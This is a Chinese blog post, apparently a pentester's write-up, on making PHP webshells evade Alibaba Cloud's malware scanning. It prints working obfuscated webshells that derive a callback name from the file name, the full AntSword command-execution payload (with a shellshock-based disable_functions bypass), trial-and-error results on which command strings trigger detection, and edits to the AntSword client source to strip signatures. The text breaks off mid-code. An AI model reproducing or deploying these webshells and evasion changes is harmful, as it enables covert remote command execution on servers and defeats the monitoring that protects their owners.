<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  
  <title>webshell免杀过阿里云PHP | 藏青&#39;s BLOG</title>

  
  <meta name="author" content="藏青">
  

  
  <meta name="description" content="知行合一">
  

  
  <meta name="keywords" content="渗透 内网 代码审计">
  

  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black">

  <meta property="og:title" content="webshell免杀过阿里云PHP"/>

  <meta property="og:site_name" content="藏青&#39;s BLOG"/>

  
  <meta property="og:image" content="/favicon.ico"/>
  

  <link href="/favicon.ico" rel="icon">
  <link rel="alternate" href="/atom.xml" title="藏青&#39;s BLOG" type="application/atom+xml">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
<meta name="generator" content="Hexo 5.4.0"></head>


<body>
<div class="blog">
  <div class="content">

    <header>
  <div class="site-branding">
    <h1 class="site-title">
      <a href="/">藏青&#39;s BLOG</a>
    </h1>
    <p class="site-description"></p>
  </div>
  <nav class="site-navigation">
    <ul>
      
        <li><a href="/">Home</a></li>
      
        <li><a href="/archives">Archives</a></li>
      
        <li><a href="/categories">Categories</a></li>
      
        <li><a href="/links">Links</a></li>
      
    </ul>
  </nav>
</header>

    <main class="site-main posts-loop">
    <article>

  
    
    <h3 class="article-title"><span>webshell免杀过阿里云PHP</span></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2021/10/08/webshell免杀过阿里云PHP/" rel="bookmark">
        <time class="entry-date published" datetime="2021-10-08T06:27:41.000Z">
          2021-10-08
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​    基于之前成功绕过JSP的免杀经验，主要对抗的重点还是放在分离免杀，在<a target="_blank" rel="noopener" href="https://github.com/LandGrey/webshell-detect-bypass/blob/master/docs/php-webshell-detect-bypass/php-webshell-detect-bypass.md">这个</a>项目中也有一些关于RASP和沙箱对抗的经验，可以直接复用。</p>
<h3 id="从文件名获取内容"><a href="#从文件名获取内容" class="headerlink" title="从文件名获取内容"></a>从文件名获取内容</h3><p>​    云查杀会将我们传入的文件重命名，因此我们可以利用真实的webshell和沙箱中的文件名不一致来绕过。</p>
<span id="more"></span>

<ul>
<li>下面的程序会从文件名中取出r并使用</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;LandGrey&quot;</span>;</span><br><span class="line"><span class="variable">$key</span> = substr(<span class="keyword">__FILE__</span>,-<span class="number">5</span>,-<span class="number">4</span>);</span><br><span class="line">$&#123;<span class="string">&quot;LandGrey&quot;</span>&#125; =  <span class="variable">$key</span>.<span class="string">&quot;Land!&quot;</span>;</span><br><span class="line"><span class="variable">$f</span> = pack(<span class="string">&quot;H*&quot;</span>, <span class="string">&quot;13&quot;</span>.<span class="string">&quot;3f120b1655&quot;</span>) ^ <span class="variable">$LandGrey</span>;</span><br><span class="line">array_intersect_uassoc (<span class="keyword">array</span>(<span class="variable">$_REQUEST</span>[<span class="variable">$password</span>] =&gt; <span class="string">&quot;&quot;</span>), <span class="keyword">array</span>(<span class="number">1</span>), <span class="variable">$f</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>​    由于我测试的PHP版本在7以上，不能使用assert，所以要稍微修改一下。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable">$a</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;LandGrey&quot;</span>;</span><br><span class="line"><span class="variable">$key</span> = substr(<span class="keyword">__FILE__</span>,-<span class="number">5</span>,-<span class="number">4</span>);</span><br><span class="line">$&#123;<span class="string">&quot;LandGrey&quot;</span>&#125; =  <span class="variable">$key</span>.<span class="string">&quot;Land!&quot;</span>;</span><br><span class="line"><span class="variable">$f</span> = pack(<span class="string">&quot;H*&quot;</span>, <span class="string">&quot;0629121a&quot;</span>) ^ <span class="variable">$LandGrey</span>;</span><br><span class="line">array_intersect_uassoc (<span class="keyword">array</span>(<span class="variable">$_REQUEST</span>[<span class="variable">$password</span>] =&gt; <span class="string">&quot;&quot;</span>), <span class="keyword">array</span>(<span class="number">1</span>), <span class="variable">$f</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>​    OK，经过测试，这样确实可以过阿里云的查杀，但是当执行命令后会爆一个进程异常行为，看起来是webshell连接工具的特征被标记了。</p>
<p><img src="/2021/10/08/webshell%E5%85%8D%E6%9D%80%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91PHP/image-20211008164723424.png" alt="image-20211008164723424"></p>
<p>​    从上面的截图中可以推测，主要是父进程执行的特征比较明显,所以可以尝试找到这部分的内容，看能否更改。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/sh -c cd /var/www/html;ls;echo [S];pwd;echo [E]</span><br></pre></td></tr></table></figure>

<p>​    首先我们一定很好奇，<code>为什么一定要加echo [S];pwd;echo [E]？</code>，我们可以抓一个命令执行的数据包分析一下。请求包中主要的代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">@ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">@set_time_limit(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asenc</span>(<span class="params"><span class="variable">$out</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> @base64_encode(<span class="variable">$out</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asoutput</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$output</span> = ob_get_contents();</span><br><span class="line">    ob_end_clean();</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;a34&quot;</span>.</span><br><span class="line">    <span class="string">&quot;be65&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> @asenc(<span class="variable">$output</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;12f680&quot;</span>.</span><br><span class="line">    <span class="string">&quot;ecc486&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">ob_start();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="variable">$p</span> = base64_decode(substr(<span class="variable">$_POST</span>[<span class="string">&quot;y09523d8d31747&quot;</span>], <span class="number">2</span>));</span><br><span class="line">    <span class="variable">$s</span> = base64_decode(substr(<span class="variable">$_POST</span>[<span class="string">&quot;h5718ddf00b51b&quot;</span>], <span class="number">2</span>));</span><br><span class="line">    <span class="variable">$envstr</span> = @base64_decode(substr(<span class="variable">$_POST</span>[<span class="string">&quot;l723784e81c292&quot;</span>], <span class="number">2</span>));</span><br><span class="line">    <span class="variable">$d</span> = dirname(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);</span><br><span class="line">    <span class="variable">$c</span> = substr(<span class="variable">$d</span>, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">&quot;/&quot;</span> ? <span class="string">&quot;-c \&quot;<span class="subst">&#123;$s&#125;</span>\&quot;&quot;</span> : <span class="string">&quot;/c \&quot;<span class="subst">&#123;$s&#125;</span>\&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (substr(<span class="variable">$d</span>, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">&quot;/&quot;</span>) &#123;</span><br><span class="line">        @putenv(<span class="string">&quot;PATH=&quot;</span>.getenv(<span class="string">&quot;PATH&quot;</span>).</span><br><span class="line">            <span class="string">&quot;:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @putenv(<span class="string">&quot;PATH=&quot;</span>.getenv(<span class="string">&quot;PATH&quot;</span>).</span><br><span class="line">            <span class="string">&quot;;C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$envstr</span>)) &#123;</span><br><span class="line">        <span class="variable">$envarr</span> = explode(<span class="string">&quot;|||asline|||&quot;</span>, <span class="variable">$envstr</span>);</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$envarr</span> <span class="keyword">as</span> <span class="variable">$v</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$v</span>)) &#123;</span><br><span class="line">                @putenv(str_replace(<span class="string">&quot;|||askey|||&quot;</span>, <span class="string">&quot;=&quot;</span>, <span class="variable">$v</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$r</span> = <span class="string">&quot;<span class="subst">&#123;$p&#125;</span> <span class="subst">&#123;$c&#125;</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fe</span>(<span class="params"><span class="variable">$f</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$d</span> = explode(<span class="string">&quot;,&quot;</span>, @ini_get(<span class="string">&quot;disable_functions&quot;</span>));</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$d</span>)) &#123;</span><br><span class="line">            <span class="variable">$d</span> = <span class="keyword">array</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$d</span> = array_map(<span class="string">&#x27;trim&#x27;</span>, array_map(<span class="string">&#x27;strtolower&#x27;</span>, <span class="variable">$d</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (function_exists(<span class="variable">$f</span>) &amp;&amp; is_callable(<span class="variable">$f</span>) &amp;&amp; !in_array(<span class="variable">$f</span>, <span class="variable">$d</span>));</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">runshellshock</span>(<span class="params"><span class="variable">$d</span>, <span class="variable">$c</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (substr(<span class="variable">$d</span>, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">&quot;/&quot;</span> &amp;&amp; fe(<span class="string">&#x27;putenv&#x27;</span>) &amp;&amp; (fe(<span class="string">&#x27;error_log&#x27;</span>) || fe(<span class="string">&#x27;mail&#x27;</span>))) &#123;</span><br><span class="line">            <span class="keyword">if</span> (strstr(readlink(<span class="string">&quot;/bin/sh&quot;</span>), <span class="string">&quot;bash&quot;</span>) != <span class="literal">FALSE</span>) &#123;</span><br><span class="line">                <span class="variable">$tmp</span> = tempnam(sys_get_temp_dir(), <span class="string">&#x27;as&#x27;</span>);</span><br><span class="line">                putenv(<span class="string">&quot;PHP_LOL=() &#123; x; &#125;; <span class="subst">$c</span> &gt;<span class="subst">$tmp</span> 2&gt;&amp;1&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (fe(<span class="string">&#x27;error_log&#x27;</span>)) &#123;</span><br><span class="line">                    error_log(<span class="string">&quot;a&quot;</span>, <span class="number">1</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    mail(<span class="string">&quot;a@127.0.0.1&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;-bv&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$output</span> = @file_get_contents(<span class="variable">$tmp</span>);</span><br><span class="line">            @unlink(<span class="variable">$tmp</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$output</span> != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">print</span>(<span class="variable">$output</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">runcmd</span>(<span class="params"><span class="variable">$c</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$ret</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$d</span> = dirname(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);</span><br><span class="line">        <span class="keyword">if</span> (fe(<span class="string">&#x27;system&#x27;</span>)) &#123;</span><br><span class="line">            @system(<span class="variable">$c</span>, <span class="variable">$ret</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">elseif</span>(fe(<span class="string">&#x27;passthru&#x27;</span>)) &#123;</span><br><span class="line">            @passthru(<span class="variable">$c</span>, <span class="variable">$ret</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">elseif</span>(fe(<span class="string">&#x27;shell_exec&#x27;</span>)) &#123;</span><br><span class="line">            <span class="keyword">print</span>(@shell_exec(<span class="variable">$c</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">elseif</span>(fe(<span class="string">&#x27;exec&#x27;</span>)) &#123;</span><br><span class="line">                @exec(<span class="variable">$c</span>, <span class="variable">$o</span>, <span class="variable">$ret</span>);</span><br><span class="line">                <span class="keyword">print</span>(join(<span class="string">&quot;&quot;</span>,<span class="variable">$o</span>));</span><br><span class="line">                            &#125;</span><br><span class="line">        <span class="keyword">elseif</span>(fe(<span class="string">&#x27;popen&#x27;</span>))&#123;</span><br><span class="line">            <span class="variable">$fp</span>=@popen(<span class="variable">$c</span>,<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">            <span class="keyword">while</span>(!@feof(<span class="variable">$fp</span>))&#123;</span><br><span class="line">                <span class="keyword">print</span>(@fgets(<span class="variable">$fp</span>,<span class="number">2048</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            @pclose(<span class="variable">$fp</span>);&#125;</span><br><span class="line">            <span class="keyword">elseif</span>(fe(<span class="string">&#x27;proc_open&#x27;</span>))&#123;</span><br><span class="line">                <span class="variable">$p</span> = @proc_open(<span class="variable">$c</span>, <span class="keyword">array</span>(<span class="number">1</span> =&gt; <span class="keyword">array</span>(<span class="string">&#x27;pipe&#x27;</span>, <span class="string">&#x27;w&#x27;</span>), <span class="number">2</span> =&gt; <span class="keyword">array</span>(<span class="string">&#x27;pipe&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)), <span class="variable">$io</span>);</span><br><span class="line">                <span class="keyword">while</span>(!@feof(<span class="variable">$io</span>[<span class="number">1</span>]))&#123;</span><br><span class="line">                    <span class="keyword">print</span>(@fgets(<span class="variable">$io</span>[<span class="number">1</span>],<span class="number">2048</span>));</span><br><span class="line">                &#125;<span class="keyword">while</span>(!@feof(<span class="variable">$io</span>[<span class="number">2</span>]))&#123;</span><br><span class="line">                    <span class="keyword">print</span>(@fgets(<span class="variable">$io</span>[<span class="number">2</span>],<span class="number">2048</span>));</span><br><span class="line">                &#125;</span><br><span class="line">                @fclose(<span class="variable">$io</span>[<span class="number">1</span>]);</span><br><span class="line">                @fclose(<span class="variable">$io</span>[<span class="number">2</span>]);</span><br><span class="line">                @proc_close(<span class="variable">$p</span>);</span><br><span class="line">            &#125;<span class="keyword">elseif</span>(fe(<span class="string">&#x27;antsystem&#x27;</span>))&#123;</span><br><span class="line">                @antsystem(<span class="variable">$c</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">elseif</span>(runshellshock(<span class="variable">$d</span>, <span class="variable">$c</span>)) &#123;<span class="keyword">return</span> <span class="variable">$ret</span>;&#125;</span><br><span class="line">            <span class="keyword">elseif</span>(substr(<span class="variable">$d</span>,<span class="number">0</span>,<span class="number">1</span>)!=<span class="string">&quot; /&quot;</span> &amp;&amp; @class_exists(<span class="string">&quot;COM &quot;</span>))&#123;</span><br><span class="line">            <span class="variable">$w</span>=<span class="keyword">new</span> COM(<span class="string">&#x27;WScript.shell&#x27;</span>);</span><br><span class="line">            <span class="variable">$e</span>=<span class="variable">$w</span>-&gt;exec(<span class="variable">$c</span>);</span><br><span class="line">            <span class="variable">$so</span>=<span class="variable">$e</span>-&gt;StdOut();</span><br><span class="line">            <span class="variable">$ret</span>.=<span class="variable">$so</span>-&gt;ReadAll();</span><br><span class="line">            <span class="variable">$se</span>=<span class="variable">$e</span>-&gt;StdErr();</span><br><span class="line">            <span class="variable">$ret</span>.=<span class="variable">$se</span>-&gt;ReadAll();</span><br><span class="line">            <span class="keyword">print</span>(<span class="variable">$ret</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;<span class="variable">$ret</span> = <span class="number">127</span>;&#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$ret</span>;&#125;;</span><br><span class="line">     <span class="variable">$ret</span>=@runcmd(<span class="variable">$r</span>.<span class="string">&quot;2 &gt; &amp; 1 &quot;</span>);<span class="keyword">print</span> (<span class="variable">$ret</span>!=<span class="number">0</span>)?<span class="string">&quot;</span></span><br><span class="line"><span class="string">                            ret = &#123;</span></span><br><span class="line"><span class="string">                                <span class="subst">$ret</span></span></span><br><span class="line"><span class="string">                            &#125;</span></span><br><span class="line"><span class="string">                            &quot;</span>:<span class="string">&quot;</span></span><br><span class="line"><span class="string">                            &quot;</span>;;&#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;<span class="keyword">echo</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string">                            ERROR: //&quot;</span>.<span class="variable">$e</span>-&gt;getMessage();&#125;;asoutput();<span class="keyword">die</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>​    命令执行的逻辑主要在<code>runcmd</code>函数中，而<code>runcmd</code>的参数为<code>$r</code>，<code>$r</code>是由<code> &quot;&#123;$p&#125; &#123;$c&#125;&quot;;</code>组成，<code>$c</code>是从<code>$s</code>中提取的。</p>
<p><img src="/2021/10/08/webshell%E5%85%8D%E6%9D%80%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91PHP/image-20211008174219308.png" alt="image-20211008174219308"></p>
<p><code>$s</code>解码后内容如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd &quot;/var/www/html&quot;;ls;echo [S];pwd;echo [E]</span><br></pre></td></tr></table></figure>

<p>我们对返回包内容解码，可以看到[S]和[E]中间为pwd的结果，蚁剑会提取这个结果并在客户端显示。</p>
<p><img src="/2021/10/08/webshell%E5%85%8D%E6%9D%80%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91PHP/image-20211008174321473.png" alt="image-20211008174321473"></p>
<p><img src="/2021/10/08/webshell%E5%85%8D%E6%9D%80%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91PHP/image-20211008174459642.png" alt="image-20211008174459642"></p>
<p><code>[S]</code>和<code>[E]</code>其实也就是用来分割的作用，所以我们可以将其替换,但是替换成其他字符还是会被查杀。</p>
<p><img src="/2021/10/08/webshell%E5%85%8D%E6%9D%80%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91PHP/image-20211008175245649.png" alt="image-20211008175245649"></p>
<p>猜测是因为<code>[]</code>的问题，去掉了<code>[]</code>仍然会被杀，索性去掉<code>echo [A];pwd;echo [A]</code>这段内容，这样确实可以过，但是会影响shell的正常使用。之后我又做了如下测试。</p>
<ul>
<li>cd “/var/www/html”;ls;echo @;pwd;echo @; 杀</li>
<li>cd “/var/www/html”;ls;echo @;pwd; 不杀</li>
<li>cd “/var/www/html”;ls;pwd;  不杀</li>
</ul>
<p>通过上面的测试，只要在pwd前只使用一个echo就不会被杀，而一个echo也满足我们的使用需求了，下来我们要针对客户端简单的剔除特征。</p>
<p>这部分的特征在<code>antSword\source\modules\terminal\index.js</code>文件中，代码如下：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 根据执行命令&amp;&amp;路径生成最终command</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param  <span class="type">&#123;String&#125;</span> </span>cmd  要执行的命令</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param  <span class="type">&#123;String&#125;</span> </span>path 当前路径</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@return <span class="type">&#123;String&#125;</span>      </span>最终执行命令</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="function"><span class="title">parseCmd</span>(<span class="params">cmd, path</span>)</span> &#123;</span><br><span class="line">    path = path</span><br><span class="line">      .replace(<span class="regexp">/\\\\/g</span>, <span class="string">&#x27;\\&#x27;</span>)</span><br><span class="line">      .replace(<span class="regexp">/&quot;/g</span>, <span class="string">&#x27;\\&quot;&#x27;</span>)</span><br><span class="line">      .replace(<span class="regexp">/\\/g</span>, <span class="string">&#x27;\\\\&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">this</span>.isWin ?</span><br><span class="line">      <span class="built_in">this</span>.isPowershell ?</span><br><span class="line">      <span class="string">`cd &quot;<span class="subst">$&#123;path&#125;</span>&quot;;<span class="subst">$&#123;cmd&#125;</span>;echo [S];(pwd).path;echo [E]`</span> :</span><br><span class="line">      <span class="string">`cd /d &quot;<span class="subst">$&#123;path&#125;</span>&quot;&amp;<span class="subst">$&#123;cmd&#125;</span>&amp;echo [S]&amp;cd&amp;echo [E]`</span> :</span><br><span class="line">      <span class="string">`cd &quot;<span class="subst">$&#123;path&#125;</span>&quot;;<span class="subst">$&#123;cmd&#125;</span>;echo [S];pwd;echo [E]`</span>);</span><br><span class="line">  &#125;</span><br><span class="line">...</span><br><span class="line"><span class="comment">// 开始执行命令</span></span><br><span class="line">      <span class="built_in">this</span></span><br><span class="line">        .core</span><br><span class="line">        .request(<span class="built_in">this</span>.core.command.exec(&#123;</span><br><span class="line">          <span class="attr">cmd</span>: <span class="built_in">this</span>.parseCmd(cmd, <span class="built_in">this</span>.path),</span><br><span class="line">          <span class="attr">bin</span>: _bin,</span><br><span class="line">          <span class="attr">env</span>: <span class="built_in">Object</span>.keys(<span class="built_in">this</span>.asenvironmet).map(<span class="function">(<span class="params">k</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">`<span class="subst">$&#123;k&#125;</span>|||askey|||<span class="subst">$&#123;<span class="built_in">this</span>.asenvironmet[k]&#125;</span>|||asline|||`</span>;</span><br><span class="line">          &#125;).join(<span class="string">&#x27;&#x27;</span>),</span><br><span class="line">        &#125;))</span><br><span class="line">        .then(<span class="function">(<span class="params">ret</span>) =&gt;</span> &#123;</span><br><span class="line">          <span class="keyword">let</span> _ = antSword.unxss(ret[<span class="string">&#x27;text&#x27;</span>], <span class="literal">false</span>);</span><br><span class="line">          <span class="comment">// 解析出命令执行路径</span></span><br><span class="line">          <span class="keyword">const</span> indexS = _.lastIndexOf(<span class="string">&#x27;[S]&#x27;</span>);</span><br><span class="line">          <span class="keyword">const</span> indexE = _.lastIndexOf(<span class="string">&#x27;[E]&#x27;</span>);</span><br><span class="line">          <span class="keyword">let</span> _path = _.substr(indexS + <span class="number">3</span>, indexE - indexS - <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">let</span> output = _.replace(<span class="string">`[S]<span class="subst">$&#123;_path&#125;</span>[E]`</span>, <span class="string">&#x27;&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>所以我们更改的主要有如下的部分，一个是发送命令的部分。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">parseCmd</span>(<span class="params">cmd, path</span>)</span> &#123;</span><br><span class="line">  path = path</span><br><span class="line">    .replace(<span class="regexp">/\\\\/g</span>, <span class="string">&#x27;\\&#x27;</span>)</span><br><span class="line">    .replace(<span class="regexp">/&quot;/g</span>, <span class="string">&#x27;\\&quot;&#x27;</span>)</span><br><span class="line">    .replace(<span class="regexp">/\\/g</span>, <span class="string">&#x27;\\\\&#x27;</span>);</span><br><span class="line">  <span class="keyword">return</span> (<span class="built_in">this</span>.isWin ?</span><br><span class="line">    <span class="built_in">this</span>.isPowershell ?</span><br><span class="line">    <span class="string">`cd &quot;<span class="subst">$&#123;path&#125;</span>&quot;;<span class="subst">$&#123;cmd&#125;</span>;echo 